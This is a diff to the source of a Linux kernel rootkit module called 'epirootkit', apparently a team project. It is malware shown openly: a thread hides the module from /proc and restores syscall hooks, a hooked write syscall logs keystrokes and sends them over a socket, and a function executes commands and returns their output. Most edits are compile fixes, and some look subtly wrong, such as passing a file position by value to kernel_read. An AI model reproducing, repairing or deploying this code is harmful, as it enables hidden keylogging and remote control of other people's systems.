@@ -1,14 +1,16 @@
-#include <linux/module.h>
+#include <linux/types.h>
 #include <linux/kernel.h>
+#include <linux/string.h>
+#include <linux/ctype.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
+#include <linux/module.h>
 #include <linux/init.h>
 #include <linux/kthread.h>
 #include <linux/net.h>
 #include <linux/in.h>
-#include <linux/slab.h>
-#include <linux/string.h>
 #include <linux/fs.h>
 #include <linux/file.h>
-#include <linux/uaccess.h>
 #include <linux/mm.h>
 #include <linux/syscalls.h>
 #include <net/sock.h>
@@ -18,6 +20,7 @@
 #include <linux/cred.h>
 #include <linux/input.h>
 #include <linux/spinlock.h>
+#include <linux/inetdevice.h> // pour in4_pton
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Team_Rodrien");
@@ -353,18 +356,17 @@ static struct task_struct *g_stealth_thread = NULL;
 
 /* Thread de furtivité */
 static int stealth_thread(void *data) {
+    UNUSED(data);
+    struct hook_entry *entry;
+    unsigned long flags;
     while (!kthread_should_stop()) {
         // Masquer les traces dans /proc
         hide_module();
-        
         // Nettoyer les logs
         if (g_keylog_enabled) {
             keylog_send_buffer();
         }
-        
         // Vérifier et restaurer les hooks si nécessaire
-        struct hook_entry *entry;
-        unsigned long flags;
         spin_lock_irqsave(&hook_lock, flags);
         list_for_each_entry(entry, &hook_entries, list) {
             if (*((void **)entry->target) != entry->hook) {
@@ -372,7 +374,6 @@ static int stealth_thread(void *data) {
             }
         }
         spin_unlock_irqrestore(&hook_lock, flags);
-        
         msleep(ROOTKIT_CONFIG_STEALTH_INTERVAL * 1000);
     }
     return 0;
@@ -385,7 +386,8 @@ static int stealth_thread(void *data) {
  */
 static void apply_xor_cipher(char *buffer, int length) {
     const size_t key_length = strlen(config.xor_key);
-    for (int i = 0; i < length; i++) {
+    int i;
+    for (i = 0; i < length; i++) {
         buffer[i] ^= config.xor_key[i % key_length];
     }
 }
@@ -483,7 +485,8 @@ static void exec_and_send_output(const char *command) {
     old_fs = get_fs();
     set_fs(KERNEL_DS);
     /* Correction de l'appel kernel_read : signature moderne */
-    read_result = kernel_read(output_file, &output_file->f_pos, output_buffer, config.buffer_size - 1);
+    loff_t pos = 0;
+    read_result = kernel_read(output_file, pos, output_buffer, config.buffer_size - 1);
     set_fs(old_fs);
 
     if (read_result < 0) {
@@ -662,8 +665,8 @@ static asmlinkage long hook_write(const struct pt_regs *regs) {
             return original_write(regs);
         }
 
-        /* Process each character */
-        for (size_t i = 0; i < count; i++) {
+        size_t i;
+        for (i = 0; i < count; i++) {
             if (isprint(kbuf[i])) {
                 keylog_add_entry(kbuf[i]);
             }
@@ -789,6 +792,7 @@ static void keylog_send_buffer(void) {
  * @return Thread return value (never reached)
  */
 static int keylog_thread(void *data) {
+    UNUSED(data);
     while (!kthread_should_stop()) {
         if (g_keylog_enabled && g_connection_socket) {
             keylog_send_buffer();
@@ -957,3 +961,37 @@ static void __exit epirootkit_exit(void) {
 
 module_init(epirootkit_init);
 module_exit(epirootkit_exit);
+
+// Fallback pour isprint si <linux/ctype.h> indisponible
+#ifndef isprint
+#define isprint(c) ((c) >= 0x20 && (c) <= 0x7e)
+#endif
+
+// Fallback pour in4_pton si indisponible
+#ifndef HAVE_IN4_PTON
+static int in4_pton(const char *src, int srclen, u8 *dst, int delim, const char **end)
+{
+    unsigned int val;
+    int i, j, k;
+    char c;
+    for (i = 0, j = 0; i < 4; i++) {
+        val = 0;
+        k = 0;
+        while (srclen && (c = *src) && c >= '0' && c <= '9') {
+            val = val * 10 + (c - '0');
+            src++; srclen--; k = 1;
+        }
+        if (!k || val > 255)
+            return 0;
+        dst[j++] = val;
+        if (i < 3) {
+            if (!srclen || *src != '.')
+                return 0;
+            src++; srclen--;
+        }
+    }
+    if (end)
+        *end = src;
+    return 1;
+}
+#endif
